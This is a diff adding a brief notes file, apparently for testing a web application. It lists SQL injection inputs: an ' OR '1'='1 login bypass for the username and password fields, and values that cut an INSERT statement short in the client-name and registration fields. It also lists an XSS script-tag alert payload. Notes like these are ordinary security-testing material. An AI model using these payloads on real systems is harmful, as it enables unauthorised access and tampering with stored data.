@@ -1,0 +1,28 @@
+sqli attack login screen :
+user name : 
+' OR '1'='1
+password :
+' OR '1'='1
+
+in system 
+
+client name :
+
+test1', '1234','1'); -- 
+
+client email:
+
+anyname@abc.com
+
+
+register
+
+usernmae:
+test3', '1234', 'test@example.com'); -- 
+
+xss attack :
+
+client name : 
+<script>alert(`XSS Attack!`)</script>
+
+
